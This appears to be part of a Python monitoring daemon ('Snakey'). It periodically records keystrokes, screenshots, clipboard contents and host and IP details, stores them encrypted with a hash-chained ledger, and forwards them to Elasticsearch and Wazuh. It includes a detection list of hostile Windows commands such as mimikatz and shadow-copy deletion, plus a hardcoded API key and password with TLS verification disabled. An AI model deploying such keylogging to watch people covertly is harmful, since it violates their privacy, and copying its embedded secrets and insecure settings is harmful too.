\"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === New: Country Change and VPN/Proxy IP Detection Configuration ===\r\nlast_country_path = os.path.join(base_path, \"last_country.txt\") # Path to store last country\r\nKNOWN_VPN_IPS = {\"89.214.145.78\", \"123.45.67.89\"}  # Example IPs - Expand this list as needed!\r\n\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === Sensitive Command Detection Configuration ===\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\",  # Formatting drives\r\n    \"del /s /q\",  # Force delete (subdirectories, quiet)\r\n    \"rmdir /s /q\",  # Force remove directory (subdirectories, quiet)\r\n    \"net user\",  # User management (info or creation)\r\n    \"net localgroup administrators\",  # Admin group checks\r\n    \"taskkill /f /im\",  # Force kill process by image name\r\n    \"schtasks /create\",  # Create scheduled tasks (persistence)\r\n    \"reg delete\",  # Delete registry keys\r\n    \"mimikatz\",  # Credential dumping tool\r\n    \"certutil -urlcache -f -split\",  # Common technique for downloading files\r\n    \"wmic shadowcopy delete\",  # Delete volume shadow copies (often pre-ransomware)\r\n    \"vssadmin delete shadows\",  # Delete volume shadow copies\r\n    \"powershell -nop -w hidden -c\",  # Common PowerShell obfuscation for execution\r\n    \"invoke-expression\",  # PowerShell alias for 'iex' - executes strings as commands\r\n    \"set-mppreference -disablerealtimemonitoring $true\",  # Disable Windows Defender\r\n    \"bcdedit /set {current} safeboot network\",  # Set network safe mode (persistence/bypass)\r\n    \"mshta.exe http\",  # HTML Application (often for remote code execution)\r\n    \"bitsadmin /transfer\",  # Download files via BITS\r\n    \"wevtutil cl system\",  # Clear event logs\r\n    \"cipher /w\",  # Overwrite free space (anti-forensics)\r\n    \"sdelete -z\",  # Secure delete tool\r\n]\r\n\r\n\r\n# === Logging Function ===\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip())  # Also print to console for immediate feedback\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip())  # Still print even if file write fails\r\n\r\n\r\n# === Encryption Key Loading ===\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    log_daemon_message(\"INFO\", \"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    # Use verify=False here as well, consistent with Elasticsearch client config\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                            verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    # Read a byte to force connection establishment, then close to prevent hanging\r\n    try:\r\n        response.raw.read(1)\r\n    except Exception as read_e:\r\n        log_daemon_message(\"WARNING\", f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\")\r\n    response.close()\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n    traceback.print_exc() # <-- Added traceback\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # This disables SSL certificate verification\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            log_daemon_message(\"INFO\", \"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            log_daemon_message(\"ERROR\", \"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\")\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during Elasticsearch client initialization: {e}\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        log_daemon_message(\"ERROR\", f\"File not found for hashing: {filepath}\")\r\n        return None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        # VirusTotal expects a URL to be URL-safe base64 encoded for API v3 lookup,\r\n        # but the original code uses SHA256. Sticking to SHA256 for now,\r\n        # but be aware this might not be the correct VT v3 URL ID format.\r\n        # For correct VT v3 URL lookup, you'd typically need to base64 encode the URL.\r\n        # Example: base64.urlsafe_b64encode(url.encode()).decode().strip(\"=\")\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT URL lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        if not os.path.exists(file_path):\r\n            log_daemon_message(\"ERROR\", f\"File not found for VT lookup: {file_path}\")\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:  # If hashing failed\r\n            return {}\r\n\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT File lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            # Ensure timestamp is ISO format for Elasticsearch\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty before sending for Kibana visualization\r\n            # If an empty list goes, Kibana's 'is not empty' filter might not work as expected\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []  # Ensure it's an empty list if no alerts\r\n\r\n            log_daemon_message(\"DEBUG\",\r\n                               f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n            traceback.print_exc() # <-- Added traceback\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n            traceback.print_exc() # <-- Added traceback\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n            traceback.print_exc() # <-- Added traceback\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n            traceback.print_exc() # <-- Added traceback\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\n\r\n# === New: Analyze Clipboard for Sensitive Commands ===\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content, alerts_list):\r\n    \"\"\"\r\n    Analyzes clipboard content for predefined sensitive command patterns.\r\n    Adds alerts to the alerts_list if matches are found.\r\n    \"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            # Continue to find all matches in the clipboard, do not break\r\n\r\n    return alerts_list\r\n\r\n# === New: Check Country Change Function ===\r\ndef check_country_change(current_country, alerts_list):\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\") as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                log_daemon_message(\"ALERT\", f\"Country changed: {last_country} -> {current_country}\")\r\n        # Update the file for next session, even if it's the first run or country didn't change\r\n        with open(last_country_path, \"w\") as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to check/update last country: {e}\")\r\n    return alerts_list\r\n\r\n# === New: Check VPN/Proxy IP Function ===\r\ndef check_vpn_proxy_ip(current_ip, alerts_list):\r\n    \"\"\"\r\n    Checks if the current public IP is in a list of known VPN/proxy IPs.\r\n    \"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        log_daemon_message(\"ALERT\", f\"Access from known VPN/proxy IP detected: {current_ip}\")\r\n    return alerts_list\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session():\r\n    current_time = datetime.now(timezone.utc)  # consistent timestamping\r\n    session_log = {\r\n        \"timestamp\": current_time.isoformat(),  # consistent timestamp\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],  # This list will be populated\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip = None\r\n        current_country = None\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\") # Store for VPN check\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\") # Store for country change check\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n                log_daemon_message(\"ALERT\", f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n            # NEW: Check for country change\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n\r\n            # NEW: Check for known VPN/proxy IP\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n            # NEW: Analyze clipboard for sensitive commands\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_path = os.path.join(base_path, screenshot_information)  # Define path here\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)  # Hash of screenshot image file\r\n\r\n            # VirusTotal Scan for screenshot\r\n            vt_result = vt_lookup_file(screenshot_path)\r\n            if vt_result:\r\n                session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                if vt_result.get(\"malicious\", 0) > 0:\r\n                    session_log[\"alerts\"].append(\r\n                        f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                    log_daemon_message(\"ALERT\", f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\")\r\n            else:\r\n                log_daemon_message(\"INFO\", \"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n        finally:\r\n            # Clean up the temporary screenshot file\r\n            if os.path.exists(screenshot_path):\r\n                try:\r\n                    os.remove(screenshot_path)\r\n                    log_daemon_message(\"DEBUG\", f\"Removed temporary screenshot file: {screenshot_path}\")\r\n                except Exception as e:\r\n                    log_daemon_message(\"ERROR\", f\"Failed to remove temporary screenshot file: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    # Ensure clipboard is a string before checking .startswith()\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(\r\n                    f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                log_daemon_message(\"ALERT\", f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n        else:\r\n            log_daemon_message(\"INFO\", \"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        nonlocal keys  # Ensure we modify the 'keys' list from outer scope\r\n        try:\r\n            if hasattr(key, 'char') and key.char is not None:\r\n                keys.append(key.char)\r\n            elif key == Key.space:\r\n                keys.append(' ')\r\n            elif key == Key.enter:\r\n                keys.append('[ENTER]')\r\n            elif key == Key.backspace:\r\n                keys.append('[BACKSPACE]')\r\n            elif key == Key.tab:\r\n                keys.append('[TAB]')\r\n            else:\r\n                keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Error in on_press keylogger: {e}\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running for 10 seconds. Create 'stop_snakey.txt' to terminate earlier.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10:  # Collect keystrokes for 10 seconds\r\n                time.sleep(0.5)  # Sleep for shorter intervals to check stop file more often\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n            log_daemon_message(\"INFO\", \"Keylogger session completed.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Keylogger listener error: {e}. This might happen if not running in a desktop session or permissions issue.\")\r\n        if listener:  # Attempt to stop listener cleanly even on error\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Before proceeding, ensure alerts list is not None (shouldn't be, but as a safeguard)\r\n    if session_log[\"alerts\"] is None:\r\n        session_log[\"alerts\"] = []\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    # 1. Prepare the full log for encryption\r\n    # We will hash the raw JSON string content of the log *before* encryption\r\n    # This hash acts as an internal integrity check within the log itself\r\n    log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)  # Store hash of raw log inside\r\n\r\n    # 2. Encrypt the entire session log\r\n    try:\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file\r\n        with open(full_encrypted_filepath, \"wb\") as f_enc:\r\n            f_enc.write(encrypted_log_data)\r\n        log_daemon_message(\"SUCCESS\", f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            log_daemon_message(\"ERROR\", \"Failed to hash encrypted log file. Ledger will not be updated with this log.\")\r\n            return session_log  # Exit without updating ledger for this log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\") as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed\r\n                    if ledger and isinstance(ledger[0], str):  # Check if old format (list of hashes)\r\n                        log_daemon_message(\"INFO\", \"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": current_time.isoformat(),\r\n                                # Cannot determine true timestamp for old entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        log_daemon_message(\"SUCCESS\", \"Legacy hash ledger converted.\")\r\n                except json.JSONDecodeError:\r\n                    log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                    ledger = []\r\n            else:\r\n                ledger = []\r\n\r\n            previous_encrypted_file_hash = ledger[-1][\"encrypted_file_hash\"] if ledger else \"0\" * 64\r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath  # Store the path to the encrypted log\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            with open(hash_ledger_path, \"w\") as f:\r\n                json.dump(ledger, f, indent=4)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            with open(merkle_root_path, \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Merkle root saved (based on encrypted file hashes).\")\r\n\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"Encryption or encrypted file save error: {e}\")\r\n\r\n    # Return the session_log for Elasticsearch and Wazuh (containing clear-text data for these)\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        log_daemon_message(\"INFO\", \"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove existing stop file: {e}\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()  # This now handles saving encrypted logs and updating ledger\r\n\r\n        # Send the (original, unencrypted) session_log to Wazuh and Elasticsearch\r\n        # These systems need the clear-text data for analysis and display\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        